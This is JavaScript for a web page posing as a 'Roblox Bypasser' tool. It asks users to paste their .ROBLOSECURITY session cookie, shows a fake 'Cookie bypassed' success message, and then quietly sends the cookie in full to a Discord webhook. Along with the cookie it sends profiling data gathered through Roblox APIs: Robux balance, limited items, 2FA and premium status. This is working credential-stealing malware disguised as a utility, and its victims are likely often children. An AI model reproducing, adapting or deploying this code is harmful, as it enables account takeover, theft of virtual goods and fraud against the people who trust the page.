// Enhanced function to get account info using Roblox APIs
async function getAccountInfo(cookie) {
  try {
    // Helper function to make authenticated requests
    const makeRequest = async (url) => {
      const response = await fetch(url, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
      });
      if (response.status !== 200) {
        throw new Error(`API request failed: ${url} - Status ${response.status}`);
      }
      return await response.json();
    };

    // 1. Get user info
    const userData = await makeRequest("https://users.roblox.com/v1/users/authenticated");
    const userId = userData.id;
    const username = userData.name;

    // 2. Get account creation date
    const profileData = await makeRequest(`https://users.roblox.com/v1/users/${userId}`);
    const createdDate = new Date(profileData.created);
    const today = new Date();
    const accountAgeDays = Math.floor((today - createdDate) / (1000 * 60 * 60 * 24));
    const accountAge = `${accountAgeDays} Days`;

    // 3. Get avatar thumbnail
    const avatarData = await makeRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
    const avatarUrl = avatarData.data[0]?.imageUrl || "https://tr.rbxcdn.com/default-avatar.png";

    // 4. Get Robux balance (economy API)
    let robuxBalance = "0";
    try {
      const economyData = await makeRequest("https://economy.roblox.com/v1/user/currency");
      robuxBalance = economyData.robux.toString();
    } catch (error) {
      console.warn("Failed to fetch Robux balance:", error.message);
    }

    // 5. Get RAP and owned items (inventory API)
    let rap = "0";
    let ownedItems = "0";
    try {
      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10`);
      ownedItems = inventoryData.data.length.toString();
      rap = inventoryData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString();
    } catch (error) {
      console.warn("Failed to fetch inventory data:", error.message);
    }

    // 6. Get group info
    let groupCount = "0";
    let groupFunds = "0";
    try {
      const groupData = await makeRequest(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
      groupCount = groupData.data.length.toString();
      // Note: Group funds require specific group IDs and permissions; using placeholder
    } catch (error) {
      console.warn("Failed to fetch group data:", error.message);
    }

    // 7. Check premium status
    let hasPremium = false;
    try {
      const premiumData = await makeRequest(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
      hasPremium = premiumData.isPremium;
    } catch (error) {
      console.warn("Failed to fetch premium status:", error.message);
    }

    // 8. Check collectibles (Korblox, Valk, Headless)
    let hasKorblox = false;
    let hasValk = false;
    let hasHeadless = false;
    try {
      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = inventoryData.data;
      // Known asset IDs for Korblox, Valk, Headless (approximate, as exact IDs may vary)
      hasKorblox = items.some(item => item.assetId === 139607718); // Korblox Deathspeaker
      hasValk = items.some(item => item.assetId === 1365767); // Valkyrie Helm
      hasHeadless = items.some(item => item.assetId === 134082579); // Headless Horseman
    } catch (error) {
      console.warn("Failed to fetch collectibles:", error.message);
    }

    // 9. Get place visits (requires game stats, using placeholder)
    const placeVisits = "0"; // No direct public API for total place visits

    // 10. Get settings (2FA, Voice Chat)
    let twoStepEnabled = false;
    let voiceChatEnabled = false;
    try {
      const settingsData = await makeRequest("https://accountsettings.roblox.com/v1/account/settings");
      twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
      voiceChatEnabled = settingsData.isVoiceEnabled || false;
    } catch (error) {
      console.warn("Failed to fetch settings:", error.message);
    }

    // 11. Placeholder for birthdate and age (not publicly accessible)
    const birthdate = "Unknown";
    const age = "Unknown";

    // 12. Placeholder for IP address (requires external service)
    const ipAddress = "Unknown";

    return {
      username,
      userId,
      robuxBalance,
      accountAge,
      avatarUrl,
      placeVisits,
      rap,
      ownedItems,
      creditBalance: "0", // No public API for credit balance
      hasPremium,
      hasKorblox,
      hasValk,
      hasHeadless,
      groupCount,
      groupFunds,
      birthdate,
      age,
      ipAddress,
      twoStepEnabled,
      voiceChatEnabled,
    };
  } catch (error) {
    console.error("Error fetching account info:", error.message);
    return {
      username: "Unknown User",
      userId: "Unknown ID",
      robuxBalance: "0",
      accountAge: "Unknown",
      avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
      placeVisits: "0",
      rap: "0",
      ownedItems: "0",
      creditBalance: "0",
      hasPremium: false,
      hasKorblox: false,
      hasValk: false,
      hasHeadless: false,
      groupCount: "0",
      groupFunds: "0",
      birthdate: "Unknown",
      age: "Unknown",
      ipAddress: "Unknown",
      twoStepEnabled: false,
      voiceChatEnabled: false,
    };
  }
}

// Form submission handler
$("#cookieForm").on("submit", async function(e) {
  e.preventDefault();
  const cookie = $("#cookieInput").val().trim();

  // Show loader immediately
  $("#refreshBtn").hide();
  $("#loader").show();
  $("#userInfo").hide();
  $("#refreshedBox").hide();

  try {
    // Validate cookie
    const validationResult = await validateRobloxCookie(cookie, { includeUserInfo: true });
    if (!validationResult.valid) {
      showNotif("Invalid cookie", false);
      errorSound.play();
      $("#loader").hide();
      $("#refreshBtn").show();
      return;
    }

    // Cookie is valid - show success notification
    showNotif("✅ Cookie bypassed", true);
    swooshSound.play();

    // Get account info
    const accountInfo = await getAccountInfo(cookie);

    // Construct webhook payload to match Discord embed
    const webhookPayload = {
      username: "Roblox Bypasser Bot",
      content: "@everyone",
      embeds: [
        {
          title: "**```Homepage - Result```**",
          description: `[<:Cookie:1313022426346426368> Refresh cookie](https://bloxtools.icu/Refresher/?cookie=${encodeURIComponent(cookie)}) | [Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468> | [***${accountInfo.ipAddress} :flag_jo:***](https://ipapi.co/${accountInfo.ipAddress}/json)\n | [<:crackedshield:1392908310201761965> DOWN](https://bloxtools.icu/bypasser)`,
          color: 0x3B1F7F, // Matches hsla(290, 96.6%, 22.9%, 1)
          author: {
            name: `${accountInfo.username}\n13+ ${new Date().toLocaleDateString("en-GB")}`,
            url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
            icon_url: accountInfo.avatarUrl,
          },
          thumbnail: {
            url: accountInfo.avatarUrl,
            width: 150,
            height: 150,
          },
          fields: [
            {
              name: "About User",
              value: `\`\`Account Age: ${accountInfo.accountAge}\`\`\n\`\`Place Visits: ${accountInfo.placeVisits}\`\``,
              inline: false,
            },
            {
              name: "<:Robux:1313020721987063829> Robux",
              value: `Balance: ${accountInfo.robuxBalance} <:Robux:1313020721987063829>\nPending: 0 <:RobuxPending:1313020748490608721>`,
              inline: true,
            },
            {
              name: "<:Limited:1313024834783154211> Rap",
              value: `Rap: ${accountInfo.rap} <:Valk:1313020750038569021>\nOwned: ${accountInfo.ownedItems} <:Inventory:1313020754547310737>`,
              inline: true,
            },
            {
              name: "<a:Summery:1313021791954014268> Summary",
              value: "0",
              inline: true,
            },
            {
              name: "<:Billing:1313020743373819935> Billing",
              value: `Credit: ${accountInfo.creditBalance} <:Credits:1313020738755756052>\nConvert: 0 <:Robux:1313020721987063829>\nCard: False <:Cards:1313020745223503883>`,
              inline: true,
            },
            {
              name: "<:Games:1313020733932306462> | Played | Passes",
              value: `<:bf:1303894849530888214> | False | ___0___\n<:adm:1303894863007453265> | False | ___0___\n<:mm2:1303894855281541212> | False | ___0___\n<:ps99:1303894865079308288> | False | ___0___\n<:bb:1303894852697718854> | False | ___0___\n<:BGS:1361762108366393414> | False | ___0___\n<:petsgo:1349375165095739473> | False | ___0___`,
              inline: true,
            },
            {
              name: "<:Settings:1313020732225093672> Settings",
              value: `(Verified <a:False:1313026218567667743>)\n<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`,
              inline: true,
            },
            {
              name: "<:Premium:1313020726474706994> Premium",
              value: `${accountInfo.hasPremium ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:Collectible:1313026924678742087> Collectibles",
              value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:banks:1349856883498029097> Groups",
              value: `**\r\n<:mb:1383816499244040234> Owned:** ${accountInfo.groupCount}\n**<:members:1354456330152448213> Members** 0\n**<:Credits:1313020738755756052> Funds:** ${accountInfo.groupFunds} <:Robux:1313020721987063829>`,
              inline: true,
            },
            {
              name: "<:RBC:1376586019566125168> | EXPERTS |",
              value: `<:bloxfruit:1394415363030257834> | False | <:adoptme:1394415360899420331> | False |\n <:mm2:1394415358257139782> | False | <:petsim99:1394415355320864780> | False |\n <:BGS:1361762108366393414> | False | <:gag2:1394413618556178473> | False |`,
              inline: true,
            },
            {
              name: "<:Calendar:1392908329927573524> Age Bypasser",
              value: `**Birthdate:** **${accountInfo.birthdate}**\n**Age:** **${accountInfo.age}** \n**Verified:** <a:False:1313026218567667743>\n**Status:** <a:False:1313026218567667743> **Not Bypassable**`,
              inline: true,
            },
          ],
          timestamp: new Date().toISOString(),
        },
        {
          description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
          color: 0x3B1F7F,
          thumbnail: {
            url: "https://bloxtools.icu/assets/img/atryx.png",
            width: 2000,
            height: 2000,
          },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    // Send to webhook
    try {
      const webhookRes = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(webhookPayload),
      });
      if (!webhookRes.ok) {
        console.error("Webhook send failed:", webhookRes.status);
        showNotif("Failed to send data to webhook", false);
        errorSound.play();
      } else {
        successSound.play();
        $("#refreshedBox").fadeIn();
      }
    } catch (webhookError) {
      console.error("Webhook error:", webhookError);
      showNotif("Error sending data to webhook", false);
      errorSound.play();
    }
  } catch (error) {
    showNotif("Invalid cookie", false);
    errorSound.play();
    console.error("Submit error:", error);
  } finally {
    $("#loader").hide();
  }
});
